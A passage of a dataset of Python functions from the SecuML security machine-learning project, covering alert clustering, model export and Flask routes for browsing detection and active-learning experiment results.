    alerts = predictions.get_alerts(threshold=threshold)
    alerts_ids = [alert.instance_id for alert in alerts]
    if len(alerts_ids) == 0:
        return
    (train_instances, alerts_instances) = self._get_datasets(alerts_ids)
    if self.alerts_conf.classifier_conf is not None:
        self._classify(alerts_instances, train_instances)
    elif self.alerts_conf.clustering_conf is not None:
        self._cluster(alerts_instances)"
ANSSI-FR/SecuML,display,"def display(self, output_dir):
    return"
ANSSI-FR/SecuML,_cluster,"def _cluster(self, alerts_instances):
    self._check_num_clusters(alerts_instances)
    core_clustering_conf = self.alerts_conf.clustering_conf
    clustering_exp = self._create_clustering_exp(core_clustering_conf)
    clustering_exp.run(instances=alerts_instances, quick=True)"
ANSSI-FR/SecuML,_classify,"def _classify(self, alerts_instances, train_instances):
    classifier_conf = self.alerts_conf.classifier_conf
    model = classifier_conf.model_class(classifier_conf)
    try:
        model.training(train_instances)
    except AtLeastTwoClasses:
        self.alerts_conf.logger.warning('Two few families in the training to train a classifier. The alerts are not clustered. ')
        return
    (predicted_families, _) = model.testing(alerts_instances)
    all_families = list(model.class_labels)
    predicted_families = [all_families.index(x) for x in predicted_families.values]
    clustering_exp = self._create_clustering_exp(None)
    clustering_exp.set_clusters(alerts_instances, predicted_families, None, False, all_families)"
ANSSI-FR/SecuML,_create_clustering_exp,"def _create_clustering_exp(self, core_clustering_conf):
    exp_conf = self.test_exp.exp_conf
    features_conf = FeaturesConf(exp_conf.features_conf.input_features, exp_conf.features_conf.sparse, exp_conf.features_conf.logger, filter_in_f=exp_conf.features_conf.filter_in_f, filter_out_f=exp_conf.features_conf.filter_out_f)
    conf = ClusteringConf(exp_conf.secuml_conf, exp_conf.dataset_conf, features_conf, exp_conf.annotations_conf, core_clustering_conf, name='Alerts_%i' % exp_conf.exp_id, parent=exp_conf.exp_id)
    return AlertsClusteringExp(conf, self.test_exp.exp_conf.parent, create=True, session=self.test_exp.session)"
ANSSI-FR/SecuML,_check_num_clusters,"def _check_num_clusters(self, alerts_instances):
    num_clusters = self.alerts_conf.clustering_conf.num_clusters
    num_alerts = alerts_instances.num_instances()
    if num_alerts < num_clusters:
        self.alerts_conf.logger.warning('Cannot build %d clusters from %d alerts. num_clusters should be smaller than num_alerts.' % (num_clusters, num_alerts))
        num_clusters = min(num_alerts, 4)
        self.alerts_conf.clustering_conf.num_clusters = num_clusters
        self.alerts_conf.logger.warning('The number of clusters is set to %s' % num_clusters)"
ANSSI-FR/SecuML,_get_datasets,"def _get_datasets(self, alerts_ids):
    test_instances = self.test_exp.test_instances
    alerts_instances = test_instances.get_from_ids(alerts_ids)
    diadem_id = self.test_exp.exp_conf.parent
    query = self.test_exp.session.query(DiademExpAlchemy)
    query = query.join(DiademExpAlchemy.exp)
    query = query.join(ExpAlchemy.parents)
    query = query.filter(DiademExpAlchemy.type == 'train')
    query = query.filter(ExpAlchemy.kind == 'Detection')
    query = query.filter(ExpRelationshipsAlchemy.parent_id == diadem_id)
    train_exp_id = query.one().exp_id
    exp = experiment.get_factory().from_exp_id(train_exp_id, self.test_exp.exp_conf.secuml_conf, self.test_exp.session)
    train_instances = exp.get_instances().get_annotated_instances(label=MALICIOUS)
    return (train_instances, alerts_instances)"
ANSSI-FR/SecuML,__init__,"def __init__(self, exp, num_folds=1):
    self.exp = exp
    self.num_folds = num_folds
    self.pipelines = [None for _ in range(self.num_folds)]
    self.exec_times = None
    self.class_labels = None
    self.coefficients = None"
ANSSI-FR/SecuML,set_classifier,"def set_classifier(self, classifier, exec_times, fold_id=0):
    self.pipelines[fold_id] = classifier.pipeline
    if self.exec_times is None:
        self.exec_times = exec_times
    else:
        self.exec_times.add(exec_times)
    self.class_labels = classifier.class_labels
    self.set_coefficients(classifier, fold_id)"
ANSSI-FR/SecuML,set_coefficients,"def set_coefficients(self, classifier, fold_id):
    coefs = classifier.get_coefs()
    if coefs is not None:
        if self.coefficients is None:
            self.coefficients = Coefficients(self.exp, classifier.conf, classifier.class_labels, num_folds=self.num_folds)
        self.coefficients.add_fold(coefs, fold_id=fold_id)"
ANSSI-FR/SecuML,final_computations,"def final_computations(self):
    if self.coefficients is not None:
        self.coefficients.final_computations()"
ANSSI-FR/SecuML,display,"def display(self, directory):
    self._export_pipelines(directory)
    self._export_class_labels(directory)
    self._export_exec_times(directory)
    if self.coefficients is not None:
        self.coefficients.display(directory)"
ANSSI-FR/SecuML,_export_pipelines,"def _export_pipelines(self, directory):
    if self.num_folds == 1:
        joblib.dump(self.pipelines[0], path.join(directory, 'model.out'))
    else:
        for (fold_id, pipeline) in enumerate(self.pipelines):
            joblib.dump(pipeline, path.join(directory, 'model_%i.out' % fold_id))"
ANSSI-FR/SecuML,_export_class_labels,"def _export_class_labels(self, directory):
    class_labels = self.class_labels
    if class_labels is not None:
        class_labels = list(class_labels)
    with open(path.join(directory, 'class_labels.json'), 'w') as f:
        json.dump({'class_labels': class_labels}, f, indent=2)"
ANSSI-FR/SecuML,_export_exec_times,"def _export_exec_times(self, directory):
    with open(path.join(directory, 'exec_times.json'), 'w') as f:
        json.dump(self.exec_times.__dict__, f, indent=2)"
ANSSI-FR/SecuML,__init__,"def __init__(self, exp, num_folds):
    PredictionsMonitoringCore.__init__(self, exp.exp_conf.logger, num_folds)
    self.exp = exp"
ANSSI-FR/SecuML,final_computations,"def final_computations(self):

    def to_float(x):
        return None if x is None else float(x)

    def to_int(x):
        return None if x is None else int(x)
    PredictionsMonitoringCore.final_computations(self)
    predictions_db = [PredictionsAlchemy(exp_id=self.exp.exp_id, instance_id=to_int(p.instance_id), value=p.value_to_str(), proba=to_float(p.proba), score=to_float(p.score), rank=to_int(p.rank)) for p in self.predictions.to_list()]
    self.exp.session.bulk_save_objects(predictions_db)"
ANSSI-FR/SecuML,to_float,"def to_float(x):
    return None if x is None else float(x)"
ANSSI-FR/SecuML,to_int,"def to_int(x):
    return None if x is None else int(x)"
ANSSI-FR/SecuML,currentAnnotations,"@app.route('/currentAnnotations/<exp_id>/<iteration>/')
def currentAnnotations(exp_id, iteration):
    experiment = update_curr_exp(exp_id)
    page = render_template('active_learning/current_annotations.html', project=experiment.exp_conf.dataset_conf.project)
    if user_exp:
        filename = path.join(experiment.output_dir(), 'user_actions.log')
        file_exists = path.isfile(filename)
        mode = 'a' if file_exists else 'w'
        to_print = [datetime.datetime.now(), 'displayAnnotatedInstances']
        to_print = list(map(str, to_print))
        to_print = ','.join(to_print)
        with open(filename, mode) as f:
            f.write(to_print)
    return page"
ANSSI-FR/SecuML,editFamilies,"@app.route('/editFamilies/<exp_id>/')
def editFamilies(exp_id):
    return render_template('active_learning/edit_families.html')"
ANSSI-FR/SecuML,getFamiliesBarplot,"@app.route('/getFamiliesBarplot/<annotations_id>/<iteration>/<label>/')
def getFamiliesBarplot(annotations_id, iteration, label):
    iteration = None if iteration == 'None' else int(iteration)
    family_counts = annotations_db_tools.get_families_counts(session, annotations_id, iter_max=iteration, label=label)
    df = pd.DataFrame({'families': list(family_counts.keys()), 'counts': [family_counts[k] for k in list(family_counts.keys())]})
    sort_data_frame(df, 'families', ascending=True, inplace=True)
    barplot = BarPlot(df['families'].values)
    dataset = PlotDataset(df['counts'].values, 'Num. Instances')
    dataset.set_color(get_label_color(label))
    barplot.add_dataset(dataset)
    return jsonify(barplot.to_json())"
ANSSI-FR/SecuML,currentAnnotationIteration,"@app.route('/currentAnnotationIteration/<exp_id>/')
def currentAnnotationIteration(exp_id):
    exp = update_curr_exp(exp_id)
    return str(exp.get_current_iter())"
ANSSI-FR/SecuML,getIterMainModelConf,"@app.route('/getIterMainModelConf/<exp_id>/<iteration>/')
def getIterMainModelConf(exp_id, iteration):
    exp = update_curr_exp(exp_id)
    query = exp.session.query(ExpAlchemy)
    query = query.join(ExpAlchemy.parents)
    query = query.filter(ExpRelationshipsAlchemy.parent_id == exp.exp_id)
    query = query.filter(ExpAlchemy.kind == 'Diadem')
    query = query.filter(ExpAlchemy.name == 'AL%i-Iter%s-main' % (exp.exp_id, iteration))
    main_model_exp_id = query.one().id
    dataset_conf = exp.exp_conf.dataset_conf
    conf_filename = path.join(secuml_conf.output_data_dir, dataset_conf.project, dataset_conf.dataset, str(main_model_exp_id), 'conf.json')
    return send_file(conf_filename)"
ANSSI-FR/SecuML,runNextIteration,"@app.route('/runNextIteration/<exp_id>/<iter_num>/')
def runNextIteration(exp_id, iter_num):
    res = str(run_next_iter.s().apply_async())
    if user_exp:
        experiment = update_curr_exp(exp_id)
        filename = path.join(experiment.output_dir(), 'user_actions.log')
        file_exists = path.isfile(filename)
        mode = 'a' if file_exists else 'w'
        to_print = [datetime.datetime.now(), 'nextIteration', iter_num]
        to_print = list(map(str, to_print))
        to_print = ','.join(to_print)
        with open(filename, mode) as f:
            f.write(to_print)
    return res"
ANSSI-FR/SecuML,getLabelsMonitoring,"@app.route('/getLabelsMonitoring/<exp_id>/<iteration>/')
def getLabelsMonitoring(exp_id, iteration):
    experiment = update_curr_exp(exp_id)
    filename = path.join(experiment.output_dir(), str(iteration), 'labels_monitoring', 'labels_monitoring.json')
    with open(filename, 'r') as f:
        stats = json.load(f)
        res = {}
        res['unlabeled'] = stats['unlabeled']
        res['annotations'] = stats['global']['annotations']
        return jsonify(res)"
ANSSI-FR/SecuML,activeLearningSuggestionsMonitoring,"@app.route('/activeLearningSuggestionsMonitoring/<exp_id>/<iteration>/')
def activeLearningSuggestionsMonitoring(exp_id, iteration):
    iteration = int(iteration)
    experiment = update_curr_exp(exp_id)
    filename = path.join(experiment.output_dir(), str(iteration - 1), 'suggestions_accuracy', 'labels_families_high_confidence_suggestions.png')
    return send_file(filename)"
ANSSI-FR/SecuML,activeLearningModelsMonitoring,"@app.route('/activeLearningModelsMonitoring/<exp_id>/<iter>/<train_test>/')
def activeLearningModelsMonitoring(exp_id, iter, train_test):
    experiment = update_curr_exp(exp_id)
    directory = path.join(experiment.output_dir(), str(iter), 'model_perf')
    filename = '%s.png' % train_test
    return send_file(path.join(directory, filename), mimetype='image/png')"
ANSSI-FR/SecuML,activeLearningMonitoring,"@app.route('/activeLearningMonitoring/<exp_id>/<iteration>/<kind>/<sub_kind>/')
def activeLearningMonitoring(exp_id, iteration, kind, sub_kind):
    experiment = update_curr_exp(exp_id)
    directory = path.join(experiment.output_dir(), str(iteration))
    if kind == 'labels':
        filename = path.join(directory, 'labels_monitoring', 'iteration' + '_' + sub_kind + '.png')
    if kind == 'families':
        filename = path.join(directory, 'labels_monitoring', 'families_monitoring.png')
    if kind == 'clustering':
        filename = path.join(directory, 'clustering_evaluation', sub_kind + '_monitoring.png')
    if kind == 'time':
        filename = path.join(directory, 'execution_times.png')
    try:
        return send_file(filename, mimetype='image/png')
    except FileNotFoundError:
        return 'FileNotFoundError'"
ANSSI-FR/SecuML,getAnnotationsTypes,"@app.route('/getAnnotationsTypes/<exp_id>/<iteration>/')
@nocache
def getAnnotationsTypes(exp_id, iteration):
    query = session.query(IlabExpAlchemy)
    query = query.filter(IlabExpAlchemy.id == exp_id)
    query = query.filter(IlabExpAlchemy.iter == iteration)
    res = query.one()
    return jsonify({k: getattr(res, k) for k in ['uncertain', 'malicious', 'benign']})"
ANSSI-FR/SecuML,getRcdClusteringId,"@app.route('/getRcdClusteringId/<exp_id>/<iteration>/')
def getRcdClusteringId(exp_id, iteration):
    query = session.query(RcdClusteringExpAlchemy)
    query = query.filter(RcdClusteringExpAlchemy.id == exp_id)
    query = query.filter(RcdClusteringExpAlchemy.iter == iteration)
    return jsonify({'clustering_exp_id': query.one().clustering_exp})"
ANSSI-FR/SecuML,getFamiliesInstancesToAnnotate,"@app.route('/getFamiliesInstancesToAnnotate/<exp_id>/<iter>/<label>/')
def getFamiliesInstancesToAnnotate(exp_id, iter, label):
    experiment = update_curr_exp(exp_id)
    filename = path.join(experiment.output_dir(), str(iter), 'toannotate_%s.json' % label)
    return send_file(filename)"
ANSSI-FR/SecuML,getInstancesToAnnotate,"@app.route('/getInstancesToAnnotate/<exp_id>/<iteration>/<predicted_label>/')
def getInstancesToAnnotate(exp_id, iteration, predicted_label):
    experiment = update_curr_exp(exp_id)
    if predicted_label == 'None':
        filename = 'toannotate.csv'
    else:
        filename = 'toannotate_%s.csv' % predicted_label
    filename = path.join(experiment.output_dir(), iteration, filename)
    df = pd.read_csv(filename)
    queries = [int(x) for x in df.instance_id]
    return jsonify({'instances': queries})"
ANSSI-FR/SecuML,individualAnnotations,"@app.route('/individualAnnotations/<exp_id>/<iteration>/')
def individualAnnotations(exp_id, iteration):
    experiment = update_curr_exp(exp_id)
    return render_template('active_learning/individual_annotations.html', project=experiment.exp_conf.dataset_conf.project)"
ANSSI-FR/SecuML,ilabAnnotations,"@app.route('/ilabAnnotations/<exp_id>/<iteration>/')
def ilabAnnotations(exp_id, iteration):
    experiment = update_curr_exp(exp_id)
    return render_template('active_learning/ilab_annotations.html', project=experiment.exp_conf.dataset_conf.project)"
ANSSI-FR/SecuML,rcdAnnotations,"@app.route('/rcdAnnotations/<exp_id>/<iteration>/')
def rcdAnnotations(exp_id, iteration):
    experiment = update_curr_exp(exp_id)
    return render_template('active_learning/rcd_annotations.html', project=experiment.exp_conf.dataset_conf.project)"
ANSSI-FR/SecuML,_random_selection,"def _random_selection(ids, num_res=None):
    if num_res is None or len(ids) <= num_res:
        return ids
    else:
        return random.sample(ids, num_res)"
ANSSI-FR/SecuML,getNumElements,"@app.route('/getNumElements/<exp_id>/<selected_cluster>/')
def getNumElements(exp_id, selected_cluster):
    selected_cluster = int(selected_cluster)
    experiment = update_curr_exp(exp_id)
    clustering = ClustersExp.from_json(experiment.output_dir())
    cluster = clustering.clusters[selected_cluster]
    res = {}
    res['num_elements'] = cluster.num_instances()
    return jsonify(res)"
ANSSI-FR/SecuML,getClusterInstancesVisu,"@app.route('/getClusterInstancesVisu/<exp_id>/<selected_cluster>/<c_e_r>/<num_results>/')
def getClusterInstancesVisu(exp_id, selected_cluster, c_e_r, num_results):
    num_results = int(num_results)
    selected_cluster = int(selected_cluster)
    exp = update_curr_exp(exp_id)
    clustering = ClustersExp.from_json(exp.output_dir())
    ids = {}
    ids[selected_cluster] = clustering.get_cluster_instances_visu(selected_cluster, num_results, random=True)[c_e_r]
    return jsonify(ids)"
ANSSI-FR/SecuML,getClustersLabels,"@app.route('/getClustersLabels/<exp_id>/')
def getClustersLabels(exp_id):
    experiment = update_curr_exp(exp_id)
    clustering = ClustersExp.from_json(experiment.output_dir())
    clusters = []
    for c in range(clustering.num_clusters):
        clusters.append({'id': c, 'label': clustering.clusters[c].label})
    return jsonify({'clusters': clusters})"
ANSSI-FR/SecuML,getClusterLabel,"@app.route('/getClusterLabel/<exp_id>/<selected_cluster>/')
def getClusterLabel(exp_id, selected_cluster):
    selected_cluster = int(selected_cluster)
    experiment = update_curr_exp(exp_id)
    clustering = ClustersExp.from_json(experiment.output_dir())
    predicted_label = clustering.get_label(selected_cluster)
    return predicted_label"
ANSSI-FR/SecuML,getClusterLabelsFamilies,"@app.route('/getClusterLabelsFamilies/<exp_id>/<cluster_id>/')
def getClusterLabelsFamilies(exp_id, cluster_id):
    cluster_id = int(cluster_id)
    experiment = update_curr_exp(exp_id)
    clustering = ClustersExp.from_json(experiment.output_dir())
    return jsonify(clustering.get_labels_families(experiment, cluster_id))"
ANSSI-FR/SecuML,getClusterLabelFamilyIds,"@app.route('/getClusterLabelFamilyIds/<exp_id>/<cluster_id>/<label>/<family>/<num_results>/')
def getClusterLabelFamilyIds(exp_id, cluster_id, label, family, num_results):
    cluster_id = int(cluster_id)
    num_results = int(num_results)
    exp = update_curr_exp(exp_id)
    clustering = ClustersExp.from_json(exp.output_dir())
    ids = clustering.get_labe_family_ids(exp, cluster_id, label, family)
    return jsonify({'num_ids': len(ids), 'ids': _random_selection(ids, num_results)})"
ANSSI-FR/SecuML,getClusterStats,"@app.route('/getClusterStats/<exp_id>/')
def getClusterStats(exp_id):
    experiment = update_curr_exp(exp_id)
    clustering = ClustersExp.from_json(experiment.output_dir())
    num_clusters = clustering.num_clusters
    num_instances_v = np.array([None for _ in range(num_clusters)])
    labels = []
    for c in range(num_clusters):
        instances_in_cluster = clustering.clusters[c].instances_ids
        num_instances = len(instances_in_cluster)
        num_instances_v[c] = num_instances
        labels.append(clustering.clusters[c].label)
    barplot = BarPlot(labels)
    dataset = PlotDataset(num_instances_v, 'Num. Instances')
    barplot.add_dataset(dataset)
    return jsonify(barplot.to_json())"
ANSSI-FR/SecuML,getClustersColors,"@app.route('/getClustersColors/<num_clusters>/')
def getClustersColors(num_clusters):
    return jsonify({'colors': colors(num_clusters)})"
ANSSI-FR/SecuML,db_row_to_json,"def db_row_to_json(row):
    return {c.name: getattr(row, c.name) for c in row.__table__.columns}"
ANSSI-FR/SecuML,getDiademChildInfo,"@app.route('/getDiademChildInfo/<exp_id>/')
def getDiademChildInfo(exp_id):
    query = session.query(DiademExpAlchemy)
    query = query.filter(DiademExpAlchemy.exp_id == exp_id)
    return jsonify(db_row_to_json(query.one()))"
ANSSI-FR/SecuML,getDiademDetectionChildExp,"@app.route('/getDiademDetectionChildExp/<diadem_exp_id>/<child_type>/<fold_id>/<dataset>/')
def getDiademDetectionChildExp(diadem_exp_id, child_type, fold_id, dataset):

    def _get_parent_id(diadem_exp_id, child_type):
        if dataset is None or dataset == 'all':
            return diadem_exp_id
        query = session.query(DiademExpAlchemy)
        query = query.join(DiademExpAlchemy.exp)
        query = query.join(ExpAlchemy.parents)
        query = query.filter(ExpAlchemy.kind == 'Detection')
        query = query.filter(ExpRelationshipsAlchemy.parent_id == diadem_exp_id)
        query = query.filter(DiademExpAlchemy.type == child_type)
        query = query.filter(DiademExpAlchemy.fold_id == fold_id)
        return query.one().exp_id
    fold_id = None if fold_id == 'None' else int(fold_id)
    dataset = None if dataset == 'None' else dataset
    if child_type != 'cv':
        parent_id = _get_parent_id(diadem_exp_id, child_type)
        query = session.query(DiademExpAlchemy)
        query = query.join(DiademExpAlchemy.exp)
        query = query.join(ExpAlchemy.parents)
        query = query.filter(ExpAlchemy.kind == 'Detection')
        query = query.filter(ExpRelationshipsAlchemy.parent_id == parent_id)
        if dataset is not None and dataset != 'all':
            query = query.join(DiademExpAlchemy.dataset)
            query = query.filter(DatasetsAlchemy.dataset == dataset)
    else:
        query = session.query(DiademExpAlchemy)
        query = query.filter(DiademExpAlchemy.exp_id == diadem_exp_id)
    query = query.filter(DiademExpAlchemy.type == child_type)
    query = query.filter(DiademExpAlchemy.fold_id == fold_id)
    return jsonify(db_row_to_json(query.one()))"
ANSSI-FR/SecuML,getDiademTrainChildExp,"@app.route('/getDiademTrainChildExp/<diadem_exp_id>/<fold_id>/<child_type>/')
def getDiademTrainChildExp(diadem_exp_id, fold_id, child_type):
    fold_id = None if fold_id == 'None' else int(fold_id)
    query = session.query(DiademExpAlchemy)
    if child_type != 'cv':
        query = query.join(DiademExpAlchemy.exp)
        query = query.join(ExpAlchemy.parents)
        query = query.filter(ExpAlchemy.kind == 'Train')
        query = query.filter(ExpRelationshipsAlchemy.parent_id == diadem_exp_id)
    else:
        query = query.filter(DiademExpAlchemy.exp_id == diadem_exp_id)
    query = query.filter(DiademExpAlchemy.type == child_type)
    query = query.filter(DiademExpAlchemy.fold_id == fold_id)
    return jsonify(db_row_to_json(query.one()))"
ANSSI-FR/SecuML,getDiademExp,"@app.route('/getDiademExp/<exp_id>/')
def getDiademExp(exp_id):
    query = session.query(DiademExpAlchemy)
    query = query.filter(DiademExpAlchemy.exp_id == exp_id)
    return jsonify(db_row_to_json(query.one()))"
ANSSI-FR/SecuML,predictionsAnalysis,"@app.route('/predictionsAnalysis/<train_exp_id>/<index>/')
def predictionsAnalysis(train_exp_id, index):
    exp = update_curr_exp(train_exp_id)
    return render_template('diadem/predictions.html', project=exp.exp_conf.dataset_conf.project)"
ANSSI-FR/SecuML,displayAlerts,"@app.route('/alerts/<exp_id>/<analysis_type>/')
def displayAlerts(exp_id, analysis_type):
    experiment = update_curr_exp(exp_id)
    return render_template('diadem/alerts.html', project=experiment.exp_conf.dataset_conf.project)"
ANSSI-FR/SecuML,displayErrors,"@app.route('/errors/<exp_id>/<error_kind>/')
def displayErrors(exp_id, error_kind):
    experiment = update_curr_exp(exp_id)
    return render_template('diadem/errors.html', project=experiment.exp_conf.dataset_conf.project)"
ANSSI-FR/SecuML,getAlertsClusteringExpId,"@app.route('/getAlertsClusteringExpId/<test_exp_id>/')
def getAlertsClusteringExpId(test_exp_id):
    query = session.query(ExpRelationshipsAlchemy)
    query = query.join(ExpRelationshipsAlchemy.child)
    query = query.join(ExpAlchemy.diadem_exp)
    query = query.filter(ExpRelationshipsAlchemy.parent_id == test_exp_id)
    query = query.filter(DiademExpAlchemy.type == 'alerts')
    try:
        return str(query.one().child_id)
    except NoResultFound:
        return 'None'"
ANSSI-FR/SecuML,_predictions_results,"def _predictions_results(query):
    predictions = query.all()
    if predictions:
        (ids, probas, scores, ranking) = zip(*[(r.instance_id, r.proba, r.score, r.rank) for r in predictions])
    else:
        ids = []
        probas = []
        scores = []
        ranking = []
    return {'instances': ids, 'proba': probas, 'scores': scores, 'ranking': ranking}"
ANSSI-FR/SecuML,getAlerts,"@app.route('/getAlerts/<exp_id>/<analysis_type>/')
def getAlerts(exp_id, analysis_type):
    exp = update_curr_exp(exp_id)
    query = session.query(DiademExpAlchemy)
    query = query.filter(DiademExpAlchemy.exp_id == exp_id)
    diadem_exp = query.one()
    (with_proba, with_scores) = (diadem_exp.proba, diadem_exp.with_scoring)
    query = session.query(PredictionsAlchemy)
    query = query.filter(PredictionsAlchemy.exp_id == exp_id)
    if with_proba:
        threshold = exp.exp_conf.core_conf.detection_threshold
        query = query.filter(PredictionsAlchemy.proba >= threshold)
    else:
        query = query.filter(PredictionsAlchemy.value == label_str_to_bool(MALICIOUS))
    if analysis_type == 'topN' and (with_proba or with_scores):
        if with_proba:
            query = query.order_by(PredictionsAlchemy.proba.desc())
        else:
            query = query.order_by(PredictionsAlchemy.score.desc())
    elif analysis_type == 'random':
        query = call_specific_db_func(secuml_conf.db_type, 'random_order', (query,))
    query = query.limit(NUM_MAX_DISPLAY)
    return jsonify(_predictions_results(query))"
ANSSI-FR/SecuML,getPredictionsProbas,"@app.route('/getPredictionsProbas/<exp_id>/<index>/<label>/')
def getPredictionsProbas(exp_id, index, label):
    index = int(index)
    proba_min = index * 0.1
    proba_max = (index + 1) * 0.1
    query = session.query(PredictionsAlchemy)
    query = query.filter(PredictionsAlchemy.exp_id == exp_id)
    query = query.filter(PredictionsAlchemy.proba >= proba_min)
    query = query.filter(PredictionsAlchemy.proba <= proba_max)
    query = query.order_by(PredictionsAlchemy.proba.asc())
    if label != 'all':
        query = query.join(PredictionsAlchemy.instance)
        query = query.filter(InstancesAlchemy.label == label_str_to_bool(label))
    query = call_specific_db_func(secuml_conf.db_type, 'random_order', (query,))
    query = query.limit(NUM_MAX_DISPLAY)
    return jsonify(_predictions_results(query))"
ANSSI-FR/SecuML,getPredictionsScores,"@app.route('/getPredictionsScores/<exp_id>/<range_>/<label>/')
def getPredictionsScores(exp_id, range_, label):
    (score_min, score_max) = [float(x) for x in range_.split(' - ')]
    query = session.query(PredictionsAlchemy)
    query = query.filter(PredictionsAlchemy.exp_id == exp_id)
    query = query.filter(PredictionsAlchemy.score >= score_min)
    query = query.filter(PredictionsAlchemy.score <= score_max)
    query = query.order_by(PredictionsAlchemy.score.asc())
    if label != 'all':
        query = query.join(PredictionsAlchemy.instance)
        query = query.filter(InstancesAlchemy.label == label_str_to_bool(label))
    query = call_specific_db_func(secuml_conf.db_type, 'random_order', (query,))
    query = query.limit(NUM_MAX_DISPLAY)
    return jsonify(_predictions_results(query))"
ANSSI-FR/SecuML,getPredictions,"@app.route('/getPredictions/<exp_id>/<predicted_value>/<right_wrong>/<multiclass>/')
def getPredictions(exp_id, predicted_value, right_wrong, multiclass):
    multiclass = multiclass == 'true'
    query = session.query(PredictionsAlchemy)
    query = query.filter(PredictionsAlchemy.exp_id == exp_id)
    query = query.filter(PredictionsAlchemy.value == predicted_value)
    if right_wrong != 'all':
        query = query.join(PredictionsAlchemy.instance)
        if multiclass:
            field = 'family'
        else:
            field = 'label'
            predicted_value = label_str_to_bool(predicted_value)
        if right_wrong == 'right':
            query = query.filter(getattr(InstancesAlchemy, field) == predicted_value)
        elif right_wrong == 'wrong':
            query = query.filter(getattr(InstancesAlchemy, field) != predicted_value)
        else:
            assert False
    query = call_specific_db_func(secuml_conf.db_type, 'random_order', (query,))
    query = query.limit(NUM_MAX_DISPLAY)
    return jsonify(_predictions_results(query))"
ANSSI-FR/SecuML,getErrors,"@app.route('/getErrors/<exp_id>/')
def getErrors(exp_id):

    def _get_errors(exp_id, fn_fp):
        if fn_fp == 'FN':
            predicted_value = BENIGN
            ground_truth = label_str_to_bool(MALICIOUS)
        else:
            predicted_value = MALICIOUS
            ground_truth = label_str_to_bool(BENIGN)
        query = session.query(PredictionsAlchemy)
        query = query.filter(PredictionsAlchemy.exp_id == exp_id)
        query = query.filter(PredictionsAlchemy.value == predicted_value)
        query = query.join(PredictionsAlchemy.instance)
        query = query.filter(InstancesAlchemy.label == ground_truth)
        query = call_specific_db_func(secuml_conf.db_type, 'random_order', (query,))
        query = query.limit(NUM_MAX_DISPLAY)
        return _predictions_results(query)
    errors = {k: _get_errors(exp_id, k) for k in ['FN', 'FP']}
    return jsonify(errors)"
ANSSI-FR/SecuML,supervisedLearningMonitoring,"@app.route('/supervisedLearningMonitoring/<exp_id>/<kind>/')
def supervisedLearningMonitoring(exp_id, kind):
    exp = update_curr_exp(exp_id)
    filename = kind
    if kind in ['ROC', 'false_discovery_recall_curve']:
        filename += '.png'
    else:
        filename += '.json'
    return send_file(path.join(exp.output_dir(), filename))"
ANSSI-FR/SecuML,modelInterpretation,"@app.route('/modelInterpretation/<exp_id>/<class_label>/')
def modelInterpretation(exp_id, class_label):
    exp = update_curr_exp(exp_id)
    if class_label == 'None':
        filename = 'coeff_barplot.json'
    else:
        filename = 'coeff_barplot_%s.json' % class_label
    return send_file(path.join(exp.output_dir(), filename))"
ANSSI-FR/SecuML,predictionsInterpretation,"@app.route('/predictionsInterpretation/<exp_id>/')
def predictionsInterpretation(exp_id):
    query = session.query(DiademExpAlchemy)
    query = query.filter(DiademExpAlchemy.exp_id == exp_id)
    return str(query.first().pred_interp)"
ANSSI-FR/SecuML,get_train_exp,"def get_train_exp(exp_id):
    query = session.query(DiademExpAlchemy)
    query = query.filter(DiademExpAlchemy.exp_id == exp_id)
    row = query.one()
    query = session.query(ExpRelationshipsAlchemy)
    query = query.filter(ExpRelationshipsAlchemy.child_id == exp_id)
    diadem_exp_id = query.one().parent_id
    query = session.query(DiademExpAlchemy)
    query = query.join(DiademExpAlchemy.exp)
    query = query.join(ExpAlchemy.parents)
    query = query.filter(ExpRelationshipsAlchemy.parent_id == diadem_exp_id)
    query = query.filter(ExpAlchemy.kind == 'Train')
    query = query.filter(DiademExpAlchemy.fold_id == row.fold_id)
    return query.one().exp_id"
ANSSI-FR/SecuML,get_classifier,"def get_classifier(exp_id):
    train_exp_id = get_train_exp(exp_id)
    train_exp = update_curr_exp(train_exp_id)
    return joblib.load(path.join(train_exp.output_dir(), 'model.out'))"
ANSSI-FR/SecuML,getTopWeightedFeatures,"@app.route('/getTopWeightedFeatures/<exp_id>/<instance_id>/<size>/')
def getTopWeightedFeatures(exp_id, instance_id, size):
    instance_id = int(instance_id)
    classifier = get_classifier(exp_id)
    exp = update_curr_exp(exp_id)
    (f_names, f_ids, f_values) = FeaturesFromExp.get_instance(exp, instance_id)
    scaled_values = classifier.named_steps['scaler'].transform(np.reshape(f_values, (1, -1)))
    weighted_values = np.multiply(scaled_values, classifier.named_steps['model'].coef_)
    features = list(map(lambda name, id_, value, w_value: (name, id_, value, w_value), f_names, f_ids, f_values, weighted_values[0]))
    features.sort(key=lambda tup: abs(tup[3]))
    features = features[:-int(size) - 1:-1]
    (f_names, f_ids, f_values, f_weighted) = list(zip(*features))
    labels = [str(id_) for id_ in f_ids]
    tooltips = ['%s (%.2f)' % (name, f_values[i]) for (i, name) in enumerate(f_names)]
    barplot = BarPlot(labels)
    dataset = PlotDataset(np.array(f_weighted), None)
    dataset.set_color(red)
    barplot.add_dataset(dataset)
    return jsonify(barplot.to_json(tooltip_data=tooltips))"
ANSSI-FR/SecuML,_get_parent_id,"def _get_parent_id(diadem_exp_id, child_type):
    if dataset is None or dataset == 'all':
        return diadem_exp_id
    query = session.query(DiademExpAlchemy)
    query = query.join(DiademExpAlchemy.exp)
    query = query.join(ExpAlchemy.parents)
    query = query.filter(ExpAlchemy.kind == 'Detection')
    query = query.filter(ExpRelationshipsAlchemy.parent_id == diadem_exp_id)
    query = query.filter(DiademExpAlchemy.type == child_type)
    query = query.filter(DiademExpAlchemy.fold_id == fold_id)
    return query.one().exp_id"
ANSSI-FR/SecuML,_get_errors,"def _get_errors(exp_id, fn_fp):
    if fn_fp == 'FN':
        predicted_value = BENIGN
        ground_truth = label_str_to_bool(MALICIOUS)
    else:
        predicted_value = MALICIOUS
        ground_truth = label_str_to_bool(BENIGN)
    query = session.query(PredictionsAlchemy)
    query = query.filter(PredictionsAlchemy.exp_id == exp_id)
    query = query.filter(PredictionsAlchemy.value == predicted_value)
    query = query.join(PredictionsAlchemy.instance)
    query = query.filter(InstancesAlchemy.label == ground_truth)
    query = call_specific_db_func(secuml_conf.db_type, 'random_order', (query,))
    query = query.limit(NUM_MAX_DISPLAY)
    return _predictions_results(query)"
ANSSI-FR/SecuML,getFeaturesInfo,"@app.route('/getFeaturesInfo/<exp_id>/')
def getFeaturesInfo(exp_id):
    exp = update_curr_exp(exp_id)
    features_set_id = exp.exp_conf.features_conf.set_id
